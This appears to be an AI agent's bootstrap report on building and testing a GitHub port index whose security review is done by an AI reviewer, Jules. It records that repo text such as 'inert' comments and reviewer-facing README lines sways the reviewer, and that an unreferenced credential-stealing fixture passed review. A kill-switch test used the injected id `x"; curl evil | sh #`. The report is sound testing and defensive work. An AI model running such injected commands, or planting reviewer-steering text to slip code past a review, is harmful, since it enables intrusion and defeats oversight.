# Bootstrap report

Progress, decisions and results for building the AVP Ports Index from docs/SPEC.md (v1.14).

**Summary:** the index is built and configured in both repos. In staging, 12 of 13 acceptance tests passed; T9 failed on Jules's judgment (a finding for the owner, below). Six pipeline bugs were found live and fixed with tests. Calibration was skipped because the owner's ports stayed private until after the build. Production holds a single import commit and no entries.

## Progress

| Step (SPEC §12) | Status | Notes |
| --- | --- | --- |
| 1. Verify owner inputs | Done 2026-10-04 | Repos created by the agent at the owner's request; owner's gh login used instead of `OWNER_PAT`; App, bot account and Jules key supplied by the owner; secrets set by the owner straight into GitHub. The App key was verified by a staging run minting a token; Jules by a live review (below) |
| 2. Build the tree locally | Done 2026-10-03 | |
| 3. Configure staging | Done 2026-10-04 | Ruleset with checks pinned to the App (5182073), Health tracking issue created by the App and pinned |
| 4. Calibrate | Skipped | Both ports were private at "go"; the owner chose to make them public after the build (§1 input 6 rule) |
| 5. Staging smoke test | Pass | #2 |
| 6. Acceptance tests | Done | See below |
| 7. Teardown | Done 2026-10-04: 22 fixture repos and the bot's fork deleted (no other forks). Staging's scheduled workflows disabled; the staging repo itself is for the owner to delete, since the build's token has no `delete_repo` scope | |
| 8. Production | Done 2026-10-04: single "Initial import" commit (no staging history), §5.8 policy, empty data; ruleset created after the import. The repo was then recreated the same day at the owner's request, so that no commit, PR reference or cached copy GitHub holds carries the owner's full name or personal email: the first repo was renamed, its secrets were copied to the new one by a one-off workflow (no one saw the values), and the owner deleted it | |
| 9. Handoff | Done 2026-10-04: "Bootstrap handoff" issue | |

## Findings for the owner

1. **Jules judges an unreferenced malicious script inconsistently (T9 failed).** The same inert credential-stealing script (`scripts/collect.sh`, never called) scored 0 with a critical finding in `avp-fixture-suspicious` (T4), and 100 with only a medium finding in `avp-fixture-good` in three separate sessions (T9), each time reasoning that nothing executes it. A port can therefore carry malicious code that isn't wired into its build and still pass. The prompt asks whether the repo is "not malicious" and tells Jules to check build-time code first; it doesn't say that malicious code counts even when nothing references it. Changing the prompt or the threshold is the owner's call; the agent made no change (§0).
2. **Self-descriptions sway Jules both ways.** The fixtures' required README line ("Test fixture for an automated index. Contains no working software.") was read as a steering attempt in one session (q7, flagged at confidence 100; it passed on the re-run) and as harmless in others. The submodule fixture's script, whose comment called it "inert", got confidence 100 but was still flagged as steering. Text in a repo that addresses the reviewer is the main lever on the verdict.
3. **Where Jules puts the verdict varies.** Repoless sessions never returned a change set. Verdicts came from the agent's final message, or (in one session with no messages at all) from progress notes. One session finished twice without a findable verdict before the search was widened (#36).
4. **Timing.** Reviews took 8.7 to 9.3 minutes, with one 21.5-minute session that included the follow-up message. `jules_timeout_minutes` stays at 60.
5. **Jules usage.** About 32 review sessions in the staging day, under the Pro plan's 100 a day.
6. **GitHub ran the "hourly" dispatcher schedule only every two to two-and-a-half hours** (07:01, 09:13, 11:35, 14:05 UTC), which left settings changes, rescans after a health check and restores waiting. Fixed at the owner's direction (#58, decision 40): the dispatcher now also runs when `health-check`, `build-surfaces` or `kill-switch` finishes (verified: health-check finished 15:39:22, dispatcher started 15:39:24). Repository variables raise no event, so after pausing or unpausing Stage 2 or auto-merge, dispatch `stage2-dispatcher` by hand.

## Bugs found live in staging (all fixed with unit tests)

| PR | Problem | Fix |
| --- | --- | --- |
| #2 | GitHub's August 2026 ruleset default (`require_extra_approval_for_unattributed_changes: true`) would have required a human approval despite zero required approvals | Set to `false` in `tools/ruleset.json` |
| #8 | A unit test read staging's §14.1 settings and failed `self-test` (its failure correctly opened owner issue #7) | Test sets its own caps |
| #15 | Queue message said "roughly under an hour"; `llms.txt` printed "port by (@login)" without a name | Wording |
| #30 | The dispatcher started five rescans of one entry within three minutes (nothing marked a rescan as in flight); the cancelled duplicates still ran their report jobs and used up the day's rescans | Dispatcher skips entries with a queued or running rescan |
| #36 | Jules sometimes leaves the verdict in terminal output or progress notes, so a valid review ended as `error` | Search every session text for the newest schema-valid verdict; scan artifacts record activity kinds. `restore` also clears `rescan_after` |
| #46 | The Unavailable ports table linked developer profiles | Plain text |
| #58 | GitHub ran the hourly dispatcher schedule only every 2 to 2.5 hours | Dispatcher also runs after health-check, build-surfaces and kill-switch |

Staging-only test interventions: `rescan_daily_max` raised to 20 after the duplicate rescans used up the day's 6 (#37), and `owner_approved` reset on avp-fixture-good before the T9 re-run (#40). Neither is in production.

## Acceptance tests (SPEC §14)

All PR and issue numbers are in the deleted staging repo `edgytoast/avp-ports-index-staging`.

| Test | Result | Evidence | Notes |
| --- | --- | --- | --- |
| Test | Result |
| --- | --- |
| T1 Happy path | Pass |
| T2 Stage 1 outcomes | Pass |
| T3 Pipeline tampering | Pass (a, b, c) |
| T4 Malicious code | Pass |
| T5 Jules judgment | Pass (rescan step re-run once, after fixing two pipeline bugs it exposed) |
| T6 Authority | Pass |
| T7 Curator's own and owner verification | Pass |
| T8 Throttle and pauses | Pass (one hour boundary observed, then the cap restored at the owner's request; q2's Jules `error` handled as §6.3 says) |
| T9 Rescans | **Fail: Jules judgment** (finding 1). The rescan-flag mechanics passed in a supplementary run on avp-fixture-agentfiles |
| T10 Health stream | Pass, except the S1-17 step, blocked by T9 (§0) |
| T11 Reports, takedowns and appeals | Pass |
| T12 Duplicates and self-removal | Pass |
| T13 Sync recovery | Pass (q7 re-run once after a Jules false positive) |
| Unit tests U1-U20 | Pass (97 tests, green in self-test on GitHub's runners) |

### Working log

| Step | Result | Evidence | Notes |
| --- | --- | --- | --- |
| Smoke (§12.5) | pass | edgytoast/avp-ports-index-staging#2 | Three checks from trevorbilt-index ("n/a (owner change)"); self-test ran on the owner PR and passed; API merge 200 |
| §14.1 settings | done | #3 | hourly_cap 10, daily_cap 40, grace_days 0, confirm_runs 2 |
| T3(b) | pass | #4 | invalid; gate/policy failure "Entry PRs must change exactly one file under entries/ and nothing else."; stage1/stage2 "Not run" |
| §12.1 Jules check | pass | run 37176270177 | stage2-scan rescan mode, unlisted id `jules-check`, avp-fixture-good: result pass, 9.2 min, states IN_PROGRESS → COMPLETED, confidence 100, no steering; report discarded the result (no commit) |
| T6 part 1-2 | pass | #5 | Owner's PR for bot-owned thirdparty: S1-08 route + route message + needs-owner; owner:scan waived it → queued → dispatcher dispatched `stage2 pr 5` → pass (confidence 100) → App merged "entry: avp-fixture-thirdparty (#5)"; lifecycle submitted_by edgytoast, owner_approved false; github_verified true; curator_own false; merged message posted |
| Fix | done | #6, #8, #7 | #6 queue ETA wording ("under an hour"); its self-test failed because a unit test read staging's §14.1 caps; the main push run opened owner issue #7 as §8.9 specifies; #8 made the test independent of repo settings; #7 closed after self-test went green. Helper now waits for self-test before merging owner-admin PRs that touch tooling |
| T1 | pass | #9 | Fork created after the bot's new-account throttle lifted (~90 min). Stage 1 pass → stage2:queued → scanning → pass (100) → App merged "entry: avp-fixture-good (#9)"; one build-surfaces run; README, port page, feed and llms.txt list it with links pinned to eb781785; queued and merged messages; 4 pr-gate runs from the App's label events skipped, the real gate run succeeded |
| T2 | pass (nolicense pending merge) | #10-#14 | noinstall S1-07 fail and gamedata S1-11a fail, stage1-fail messages, no Stage 2; nolicense pass → queued; denylicense S1-09 route and ipa S1-11d route with route messages |
| T3(a) | pass | #16 | invalid, gate/policy failure from the base pr-gate (pull_request_target); the fork's self-test run stayed action_required (never approved) |
| T3(c) | pass | #12 | Fake `gate/stage2` success *status* posted with the owner's token: mergeStateStatus BLOCKED, not merged (ruleset needs the App's check run) |
| T6 | pass | #5, #17 | Part 3: the bot (repo owner) edited only status_notes: S1-08(a) pass, gate/stage2 "Not required: unchanged since last scan (de615add171b)", merged with no scan |
| T2 | pass | #12 | nolicense scanned (100), merged, README shows "No license stated" |
| T5 verdicts | pass | #19-#21, #23, #24 | binary: confidence 0, [high] Vendor/libfixture.dylib (opaque_binary). buildscript: 0, [critical] scripts/setup.sh and Fixture.xcodeproj/project.pbxproj (Run Script). submodule: confidence 100 but steering_attempt true, [info] vendor/subchild/scripts/collect.sh, so flag. steer: 100, steering true, flag. agentfiles: 100, pass, merged. Observation: the fixture scripts' own comments ("inert", "imitates credential theft") led Jules to score the submodule script 100; steering detection is what flagged it |
| T4 verdict | pass | #18 | suspicious: confidence 0, [critical] scripts/collect.sh (Data Exfiltration), flagged; stays open with stage2:flagged + needs-owner |
| T4 | pass | #18, #25, #26 | Flagged PR stays open (stage2:flagged, needs-owner, neutral flag message), repo in flags.yaml, no blocklist; bot push started no new scan (1 → 1) and the re-posted gate/stage2 kept the scanned external_id; new PR for the repo routed on S1-17; owner's blocklist label closed it, posted `blocklisted`, committed 3 hashes (repo_id, repo_name, slug); resubmission failed S1-05 |
| T12 | pass | #27, #28 | Duplicate of good's repo under another id failed S1-04 ("this repo is already listed as avp-fixture-good"); the bot's deletion of nolicense merged ("Not required: self-removal"), lifecycle withdrawn, feed tombstone added |
| T5 bypass | pass | #19 | Owner bypass merge of binary: scan_kind curator-reviewed, owner_approved true, pinned to 96142e9 from the flag check's external_id, flag record removed (5 → 4), README "Reviewed by the curator" |
| Bug found | fixed | #30 | The dispatcher started 5 rescans of avp-fixture-binary within 3 minutes: several dispatcher runs saw the same candidate and nothing marked a rescan as in flight. 4 duplicates cancelled; their report jobs (if: always()) recorded an `error` (triage #29, rescan_after +24h), which approve clears. Fix: the ledger collects rescans still queued or running, and the dispatcher skips those entries (unit test added) |
| T7 | pass | #22, #31?, #32-#35 | Bot's own (developer.github edgytoast) merged without the tag (curator_own false), then deleted → withdrawn + tombstone; owner's re-add routed S1-08(b), owner:scan → scanned (100) → merged: submitted_by edgytoast, curator_own true, owner_approved false; verify good merged → "✔ Verified by trevorbilt on 2026-10-04"; wrong verified_commit failed with "verified_commit for avp-fixture-own doesn't match its scanned commit 0e98ba8…. Verify the commit users are pointed at."; verify own merged → verified + "Curator's own port" |
| Bug found | fixed | #36 | The real binary rescan ended `error`: Jules completed twice without a verdict where we looked (change set / fenced block in the final message). Verdict search now covers every session text (change set, messages, terminal output, progress) for the newest schema-valid object; the scan artifact records activity kinds. `restore` now also clears rescan_after |
| T5 | pass (rescan step re-run once, as §0 allows) | #19, #37, #38 | First rescan attempt hit the duplicate-rescan bug (#30) and the verdict-location bug (#36); the cancelled duplicates also used up the day's 6 rescans, so staging's rescan_daily_max went to 20 (#37, staging only). Re-run: restore cleared rescan_after; exactly one rescan; flag → entry stayed listed (owner_approved) at 96142e9, flagged_commit df98d94, rescan_hold true, flags 4 → 5, one triage issue #38; approve → pin df98d94 curator-reviewed, hold cleared, flags 5 → 4, #38 closed |
| T9 (first run) | fail on Jules judgment, re-run under way | #39, #40 | T9.1 pass: benign commit → health shows behind, commits_since_scan 1, links still pinned; rescan pass re-pinned (automated). T9.2: the rescan of the commit adding scripts/collect.sh (same inert exfiltration script as T4) PASSED: confidence 100, one [medium] credential_theft_simulation finding, "never executed or referenced anywhere". T4 scored the same script 0. Finding: Jules judges an unreferenced malicious script inconsistently. The script ran on and restored (owner_approved true), so #40 reset owner_approved to false before the one allowed re-run. Note: repoless sessions return no change set; the verdict comes from the final message |
| T9 | **fail (Jules judgment, finding for the owner)** | #39-#41 | T9.2 was run three times (first run, the allowed re-run, and once more by a script import mistake): each time Jules passed the commit that adds the inert exfiltration script (confidence 100, one [medium] finding, reasoning that nothing executes it). T4 scored the same script 0. The rescan-flag path wasn't reached through T9; it is checked separately on agentfiles (below). T10's S1-17 step is therefore blocked, per §0 |
| T9 supplementary | pass | #42, #43 | On agentfiles (automated, not owner_approved) with an opaque .dylib: rescan flag → pulled, flagged_commit set, rescan_hold true, pin unchanged, flags 4 → 5, triage #42, no blocklist; bot edit while pulled failed S1-15 with needs-owner; restore relisted at the old pin, cleared the hold, kept flagged_commit and the flag record, closed #42; clean commit rescanned → pass, pin moved, flagged_commit cleared, flag record kept |
| T10.1-3 | pass | fixture issue trevorbilt-bot/avp-fixture-good#1 | Run 1: health issues, "May have issues" badge, still in feed and llms.txt; run 2: outreach issue opened on the fixture repo by trevorbilt-bot; run 3 (grace 0): delisted-decay, `delisted` comment, issue closed, entry in Unavailable ports with last scanned commit. The developer column there was a profile link; fixed to plain text (#46) |
| T10.4-5 | pass, except the S1-17 step (blocked by T9) | #45 | The edit PR didn't route on S1-17 (no flag record for this repo, since T9's rescans never flagged it), so it took the normal path: scanned (100), merged, relisted with health ok, decay fields reset (decay_reset_at set); the next health run left it listed with no new outreach (1 issue in total, the closed one) |
| T13 part 1 | pass | #47 | STAGE2 off; q6 queued; owner bypass merge titled "Add port [skip ci]" started no build-surfaces run; the dispatched health-check replayed it from the cursor: q6 listed (curator-reviewed), last_synced_sha advanced |
| T13 part 2 (first run) | Jules false positive, re-run | #48 | q7 (a copy of good) scored 100 but was flagged with steering_attempt true: Jules read the spec's own fixture README text ("Test fixture... Contains no working software") as steering. That session produced no agent message; its verdict was in progress notes, found only thanks to #36 |
| T11 (all but the q1 takedown) | pass | #49-#52 | Each issue got its own §8.8 acknowledgment, `triage` and assignment to edgytoast. kill-switch label on the good report → pulled (gone from README), not blocklisted (3 → 3), reply "Kill switch: pull `avp-fixture-good` done."; restore relisted it. The odd entry id `x"; curl evil \| sh #` was a validation no-op: "The kill switch did nothing: that isn't a valid entry id." Appeal and takedown request acknowledged |
| T13 part 2 | pass (re-run once) | #48 | owner:scan requested a fresh scan: pass (100); the PR titled "Add port [skip ci]" merged as "entry: avp-fixture-q7 (#48)", build-surfaces ran and regenerated |
| T8 throttle | pass (one hour boundary observed, then the cap restored to save time) | #53-#56 | hourly_cap 1 (#53). Dispatcher logs: 14:05 "0 this hour; 1 slot" → dispatched #54 (q1); 14:06 and 14:15 (×2) "1 this hour; 0 slots" → #55 and #56 stayed queued. Cap restored to 10 at 14:25 instead of waiting two more hours |
| Fix | done | #58 | Dispatcher also runs on health-check, build-surfaces and kill-switch completion (GitHub's schedule ran every 2 to 2.5 hours); verified with a dry-run health check, which started the dispatcher 2 seconds after finishing |
| T8 | pass | #53-#57, #59, #60? | FIFO: scans created q1 14:06:06, q2 15:28:11, q3 15:28:16 (after the cap was restored). Auto-merge off: q4 passed and waited with green checks; entry-only push → "Carried forward from 0cff74d232a2", no new scan (1 → 1); re-enabled → merged by the sweep. Stage 2 off: q5 queued, nothing dispatched; back on → scanned and merged. q2's scan ended `error` (Jules claimed to include the JSON and didn't, twice): needs-owner + `owner-review` message + "Security review error; waiting for the curator", as §6.3 says |
| T11 takedown | pass | #52, #62 | kill-switch takedown of q1: entry file and port page deleted, gone from README, feed tombstone, 3 blocklist hashes (no plaintext, no reasons; the file never names q1); resubmission failed S1-05 |


Dependabot: not yet observed (no Dependabot PR opened during the build).

## Calibration (SPEC §12 step 4)

Skipped. Both ports were private at "go", and the owner decided to make them public after the build. Their first real PR scans will give the same reading; as both repos are the owner's, a low score or a flag only means a bypass merge after reading the findings.

## Production smoke test (SPEC §14.5)

Run on 2026-10-04 against the recreated `edgytoast/avp-ports-index`, after the import and the ruleset:

1. `stage2-dispatcher` dispatched: success ([run](https://github.com/edgytoast/avp-ports-index/actions/runs/37220397250)); ledger "0 this hour, 0 today; 3 slots", no candidates, empty sweep.
2. `health-check` with `dry_run`: success ([run](https://github.com/edgytoast/avp-ports-index/actions/runs/37220421655)); nothing committed, opened or commented (it would only have moved the sync cursor).
3. `build-surfaces` dispatched: success ([run](https://github.com/edgytoast/avp-ports-index/actions/runs/37220446462)); the App minted its token, made its state commit and created the Health tracking issue (#1), pinned with the owner's token. README shows "No ports listed yet."
4. `self-test` dispatched: success ([run](https://github.com/edgytoast/avp-ports-index/actions/runs/37220518679)).
5. This owner-admin PR: three checks from `trevorbilt-index`, merged through the API with the owner's pull-request bypass.

Production has zero entries.

## Decisions

Choices made where the spec leaves a detail open (SPEC §0), plus the fixes from the v1.14 review that the spec's own rules point to.

### Fixes from the v1.14 review

1. **S1-15 waits for the curator, not the author.** A Stage 1 failure on S1-15 alone labels the PR `needs-owner` instead of `needs-author`, and the stale-PR closer skips any PR that carries `needs-owner` or `stage2:flagged`. Otherwise a flagged PR that SPEC §6.3 says "fails S1-15 until the owner acts" would be closed after 14 days while waiting for him.
2. **Old outreach issues after a relisting.** SPEC §5.4 says an outreach issue left open from before is closed by the next health check; §8.6 and U13 say it stays open until the checks pass or the entry leaves the index. Implemented the §8.6/U13 behavior: the old issue stays open and is reused, and Stage C counts its grace window from the later of `outreach_opened_at` and `decay_reset_at`, so its stated date can only be early, never late.
3. **One grace clock.** When the "Health tracking" comment stands in for an outreach issue, Stage C counts from `outreach_opened_at` (the comment's time), the same as for issues, instead of "`failing_since` + 1 day". On daily runs these are the same day.
4. **Dependabot cooldown.** `.github/dependabot.yml` sets `cooldown: default-days: 7` for both ecosystems, because zizmor's default-on `dependabot-cooldown` audit fails without it and SPEC §8.9 says findings are fixed, not ignored. (zizmor's `secrets-outside-env` audit is auditor-persona only since 1.24, so repository-level `APP_KEY` and `BLOCKLIST_SALT` are fine.)
5. **No duplicate scans.** The dispatcher doesn't rescan an entry while an open PR for it is `stage2:queued` or `stage2:scanning`. The discard rules already kept results correct; this saves the Jules task.
6. **Coming back after delisting.** The `delisted` message and CONTRIBUTING say that any small change to the entry file (such as `status_notes`) is enough for the PR that brings a port back, since the fix is often in the port's own repo.

### Structure

7. **Extra modules.** §3 lists the minimum; the package also has `store.py` (the index's files), `runtime.py` (job configuration from env), `writer.py` (main-writer commits with push retry), `gate.py`, `merge.py` (`try_merge`), `sync.py` (sync-state and reconcile), `report.py` (the scan report job), `killswitch.py` (kill switch and report intake) and `preflight_main.py` (bundled into the skill's `preflight.py`). Tooling also adds `tools/requirements.in`, `tools/requirements-dev.in`, `tools/requirements-dev.txt` (pytest, zizmor, actionlint-py, PyNaCl and PyJWT for bootstrap) and `.github/actionlint.yaml`.
8. **Python on runners.** Workflows use the runner's own `python3` (3.12 on ubuntu-latest) in a venv, installing with `pip --require-hashes --no-deps`, so no setup-python action is needed. Requirements are compiled with `uv pip compile --generate-hashes --universal`.
9. **Commits to main go through the Git Data API** (blobs, tree, commit, then a fast-forward-only ref update), not `git push`. No credentials ever enter git config, the App's commits are signed by GitHub, and a rejected fast-forward is the "push rejected" case for the retry in SPEC §8.0 rule 7. Each attempt starts from a fresh `origin/main` (anonymous fetch; both repos are public).
10. **App token action inputs.** `actions/create-github-app-token` v3 deprecates `app-id` in favor of `client-id`, so bootstrap also stores `APP_CLIENT_ID` and `APP_SLUG` (the App's bot login is `<slug>[bot]`) as variables, next to the spec's `APP_ID`.
11. **Bootstrap re-runs** update identity variables but create `AUTO_MERGE_ENABLED` and `STAGE2_ENABLED` only if they're missing, so a re-run never undoes a pause. `APP_KEY` is rewritten on every run (supports key rotation); `BLOCKLIST_SALT` is created once.
12. **Health tracking issue.** `bootstrap_repo.py --health-issue` creates it with an App token and pins it through GraphQL `pinIssue` with `OWNER_PAT`; if pinning is refused, it says so and the owner pins it once by hand.

### Gate and checks

13. **Hidden state in the bot comment.** Besides the spec's `<!-- avp:scans=N -->`, the single bot comment carries `<!-- avp:state {...} -->` with: the external IDs that passed on this PR and their confidence (for "Carried forward"), the flagged external ID and its findings pointers (for the flag re-post after a push), and the external ID currently being scanned (for the "scanning, same commit" rule). Only comments authored by the App's bot are read.
14. **gate/stage2 markers.** Check-run summaries carry `<!-- avp:stage2 {...} -->` (`scan` with confidence, `unchanged`, or `result` with flag or error), so sync-state can tell a scan success from "Not required" and recognise a Stage 2 result on a bypass merge. Only the App's check runs are read.
15. **Invalid PRs** get `gate/stage1` and `gate/stage2` failures titled "Not run (see gate/policy)". A contributor's invalid PR is labeled `needs-author`; the owner's isn't.
16. **Stage 1 not passing.** `gate/stage2` isn't posted for that head (it stays "expected"), and `stage2:queued` is removed so the PR leaves the queue until a push fixes it.
17. **`visionos_min`** must be a quoted string (`"26.0"`), as the schema's pattern implies. An unquoted number fails S1-03 with a hint to add quotes; the entry template quotes it.
18. **"Same repo"** for the Stage 2 decision and the PR-flag effects means the same numeric repo ID; S1-08 and S1-17 compare the `repo` URL as SPEC §6.1 says.
19. **Link checks** (S1-10) send a browser-like user agent and follow redirects; DNS failure is detected from the exception chain.

### Stage 2

20. **Jules API as used** (v1alpha, `https://jules.googleapis.com`, header `x-goog-api-key`): `POST /v1alpha/sessions` with `prompt`, `title`, `requirePlanApproval: false` and no `sourceContext`; `GET /v1alpha/sessions/{id}` (`state`: QUEUED, PLANNING, AWAITING_PLAN_APPROVAL, AWAITING_USER_FEEDBACK, IN_PROGRESS, PAUSED, FAILED, COMPLETED; `url`); `GET /v1alpha/sessions/{id}/activities` (`agentMessaged.agentMessage`, `artifacts[].changeSet.gitPatch.unidiffPatch`, `sessionFailed.reason`); `POST /v1alpha/sessions/{id}:sendMessage` (`prompt`); `POST /v1alpha/sessions/{id}:approvePlan`. Confirmed against the live API in §12 step 1 (pending).
21. **Polling.** Every 30 seconds. A valid verdict found at any stopping state is accepted. AWAITING_PLAN_APPROVAL gets `approvePlan` plus the nudge, which together count as the one nudge. After any follow-up message the poller waits for the state to change (up to 10 minutes) before judging again. HTTP 429, or a 403 or error body mentioning quota or RESOURCE_EXHAUSTED, is `deferred`.
22. **Counting.** A PR scan with `counted=true` counts toward `per_pr_max_scans` whenever it finishes `pass`, `flag` or `error`, including a pass discarded because the PR's head moved meanwhile (the Jules task was used). Deferred runs still count in the hourly and daily ledger, since that counts runs created.
23. **The result artifact** `result-<pass|flag|error|deferred>` holds a one-line file; the dispatcher reads only its name.
24. **Report token.** A `report-plan` step reads the outcome first and mints `contents: write` only for rescans and PR-mode flags, `contents: read` otherwise (SPEC §8.0 table).
25. **`scan_confidence`** is null on a curator-reviewed pin.

### Surfaces and health

26. **Scan label** shows "N commits since" for curator-reviewed entries too, so drift is visible either way.
27. **`merged` message** is posted on any transition into `listed`, including a relisting from `delisted-decay`.
28. **Entries without a scanned commit** (which can't happen through the normal paths) aren't rendered, since their links can't be pinned.
29. **Health check** reads `OUTREACH_PAT` in its single step; only the outreach code uses it.
30. **Relative links** in CONTRIBUTING and SECURITY (`../../issues/new?...`) resolve on GitHub in both staging and production; the generated surfaces use absolute links.

### Build environment

31. **Owner token.** The owner's existing gh login (account `edgytoast`, scopes `repo`, `workflow`) does everything `OWNER_PAT` was for: bootstrap, owner PRs, labels, merges and the T3(c) status. It's passed as `AVP_OWNER_TOKEN="$(gh auth token)"` and never printed. Nothing extra to revoke afterwards.
32. **Partial bootstrap.** `bootstrap_repo.py` applies what its available credentials allow and lists what's pending, so it runs once now and again when the App, bot and Jules credentials exist.
33. **Secrets go straight from the owner to GitHub.** The owner sets `APP_KEY`, `JULES_API_KEY` and `OUTREACH_PAT` himself with `gh secret set` (masked prompt or file redirect), so none of them is ever on the build machine. Bootstrap reads the App's ID, client ID and slug (not secret) from `GET /apps/trevorbilt-index` with the owner's token, and checks the secrets are present instead of writing them. The only credential the build reads locally is `TEST_PAT`, because the acceptance tests must act as `trevorbilt-bot`; it belongs to a throwaway account with access to nothing else, expires in 7 days, and is revoked after testing.
34. **Verifying without the key.** The App key is verified by a dispatched `build-surfaces` run getting past "Mint the token" (staging) and by the production smoke test. The first `build-surfaces` run also creates the Health tracking issue with the App's token; bootstrap pins it with the owner's token.
35. **Jules without a local key.** The §12 step 1 check and the calibration reviews run as `stage2-scan` dispatches in staging (environment `jules`), in rescan mode for an id that isn't listed, so the report job discards the result and writes nothing. The verdict, session states and timing are read from the run's `verdict` artifact and summary.
36. **Production bootstrap ran early** (`--skip-ruleset`, 2026-10-04) so its environments exist for the owner's secret commands. It's idempotent, and §12 step 8 runs it again before the import.
37. **Ruleset: unattributed changes.** GitHub added `require_extra_approval_for_unattributed_changes` to the pull-request rule in August 2026 and turns it on when a ruleset omits it. It asks for one human approval on PRs containing commits from unlinked accounts, even with zero required approvals. SPEC §7.2 requires zero approvals, so `tools/ruleset.json` sets it to `false` explicitly.

38. **`restore` also clears `rescan_after`.** SPEC §8.7 says `restore` resumes rescans of a held entry; after a rescan `error` the 24-hour `rescan_after` would otherwise keep blocking them, and nothing but a pin move cleared it.
39. **Finding the verdict.** Jules doesn't always put `verdict.json` where §6.2 expects: in one staging session it finished twice without a verdict in its change set or in a fenced block of its final message. The poller now searches every text the session produced (the change set's `verdict.json`, the agent's messages, terminal output such as `cat verdict.json`, and progress notes) for the most recent JSON object that passes the verdict schema, and saves which kinds of activity the session produced in the scan artifact, so a future miss can be explained without the API key.

40. **More dispatcher triggers.** In staging, GitHub ran the "hourly" dispatcher schedule only every two to two-and-a-half hours. At the owner's direction, the dispatcher now also runs when `health-check`, `build-surfaces` or `kill-switch` finishes, so rescans start right after a health check, merges and policy changes are swept right away, and `restore` or `approve` resumes rescans at once. Changing a repository variable (pausing or unpausing Stage 2 or auto-merge) raises no GitHub event; dispatch `stage2-dispatcher` by hand afterwards, or wait for the next PR or schedule.

41. **Clearer follow-up message to Jules.** In one staging session Jules said it had "included the file's content in a fenced JSON block" but sent no JSON, twice. The single follow-up message (SPEC §6.2 step 3) now says the verdict wasn't in its messages, that workspace files can't be read, and asks for the full JSON in the message itself. The review prompt is unchanged.

## Pre-deploy code review (2026-10-03)

An independent review of the built tree before anything was pushed found these, all fixed with regression tests (95 unit tests):

1. An outreach issue that can no longer be updated (repo deleted or archived, issue locked, bot blocked) raised an error that aborted the whole health check every day. Now it falls back to a "Health tracking" comment and the outreach fields are cleared.
2. The entry schema's https-URL pattern allowed `)`, `>`, `[` and `]`, so a credit or upstream URL could inject an extra Markdown link into a port page. URLs are now limited to unreserved and reserved URL characters, without brackets, angle brackets, parentheses or quotes (percent-encode them instead).
3. The report job downloaded the verdict inside the checkout, so the first state commit would have published `out/outcome.json`. Scan output now lives in `$RUNNER_TEMP`, `out/` is ignored, and the writer commits only `state/`, `blocklist/`, `entries/`, the generated surfaces and the skill's generated files.
4. Warning text on the "Health tracking" issue is now escaped (it can contain contributor URLs).
5. The hidden JSON state in the bot comment escapes `<`, `>` and `&`, so a file name quoted in a Jules finding can't close the HTML comment and expose text or mentions.
6. The dispatcher read the run name from `name` (the workflow's name) instead of `display_title` (the `run-name`), so `rescan_daily_max` was never enforced. Confirmed against the live API.
7. Commits kept every file at mode 100644, which would have flipped `preflight.py` to non-executable and then caused mode-only commits. The writer now keeps each file's mode.
8. A rate limit while polling an existing Jules session counted as `deferred`, which would start a second task. Now only session creation can defer; polling backs off and retries.
9. While waiting for Jules to react to a follow-up message, the poller now also checks for a verdict, in case the session finished again within one poll.
10. An `error` result for a commit that is no longer being reviewed (a newer scan is running, or the PR now links another commit) no longer overwrites the PR's checks or labels.
11. sync-state ignores a Stage 2 check whose `external_id` names a different repo than the one merged (an entry repointed after its scan).

## Appendix: rendered bot messages

One example of every §11 message. Live examples were copied from staging before teardown (the links no longer resolve); the rest were rendered from the same templates.

### `queued` (live, edgytoast/avp-ports-index-staging#56)

> Thanks for adding avp-fixture-q3 \(test\)! Everything checked out, so it's waiting for the automated security review (position 2, roughly 2 hours at the current pace). Nothing to do on your end, and it'll merge on its own once the review clears.

### `stage1-fail` (live, edgytoast/avp-ports-index-staging#10)

> Thanks for submitting avp-fixture-noinstall \(test\). A few things need fixing before it can be listed:
> 
> | Check | What's wrong | How to fix |
> | --- | --- | --- |
> | S1-07 | AVP-INSTALL.md isn't at the repo root | Add a non-empty AVP-INSTALL.md at the root of your repo (exact name, under 256 KB). |
> 
> Push a fix to this branch and the checks rerun automatically. If the fix is in your port's repo (adding `AVP-INSTALL.md`, say), push it there, then close and reopen this PR to rerun the checks. If something here looks wrong, say so in a comment and the curator will take a look.

### `route` (live, edgytoast/avp-ports-index-staging#13)

> Thanks for submitting avp-fixture-denylicense \(test\). Everything required is in place, but the license looks like it may not allow personal use, so the curator will take a quick look before it can go further. Nothing to do on your end for now. If you change something in your port's repo meanwhile, close and reopen this PR to rerun the checks.

### `flag` (live, edgytoast/avp-ports-index-staging#18)

> Thanks for submitting avp-fixture-suspicious \(test\). The automated security review would like a person to take a closer look at trevorbilt-bot/avp-fixture-suspicious before it's listed, so the curator will review it by hand. It pointed to: scripts/collect.sh (Data Exfiltration). Automated reviews do get things wrong, so nothing has been decided yet, and new pushes won't start another automated review until the curator has looked.

### `blocklisted` (live, edgytoast/avp-ports-index-staging#25)

> Thanks for the time you put into this submission. After a closer look, the curator has closed it, and the repository can't be resubmitted. If you think that's a mistake, please open an appeal (https://github.com/edgytoast/avp-ports-index-staging/issues/new?template=appeal.yml).

### `merged` (live, edgytoast/avp-ports-index-staging#9)

> avp-fixture-good \(test\) is now listed! Thank you for building it and for sharing it. Your entry page: https://github.com/edgytoast/avp-ports-index-staging/blob/main/ports/avp-fixture-good.md.

### `outreach (title)` (live, trevorbilt-bot/avp-fixture-good#1)

> AVP Ports Index: a few things need attention to keep avp-fixture-good (test) listed

### `outreach (body)` (live, trevorbilt-bot/avp-fixture-good#1)

> Hi, and thank you for making avp-fixture-good \(test\)! It's listed in the AVP Ports Index, and the daily check noticed a few things that make it harder for people to install:
> 
> - S1-07: AVP-INSTALL.md isn't at the repo root. Add a non-empty AVP-INSTALL.md at the root of your repo (exact name, under 256 KB).
> 
> If these are fixed by 2026-10-04, nothing changes. If not, the listing comes off the index on that date, and a quick pull request brings it back whenever things are sorted. This issue closes itself once the checks pass.
> 
> Sent by trevorbilt-bot on behalf of @edgytoast, who curates the index.

### `delisted` (live, trevorbilt-bot/avp-fixture-good#1)

> Thanks for all your work on avp-fixture-good \(test\). It has come off the index for now, since the items above are still open. Its record is kept, and a pull request updating the entry brings it back once things are fixed (any small change to the entry file, such as its `status_notes`, is enough). Closing this issue for now.

### `owner-review` (live, edgytoast/avp-ports-index-staging#55)

> Thanks for your patience with avp-fixture-q2. The automated security review couldn't settle this one on its own, so the curator will review it by hand. That can take a few days, and there's nothing to do on your end.

### `outreach-resolved` (rendered from the template)

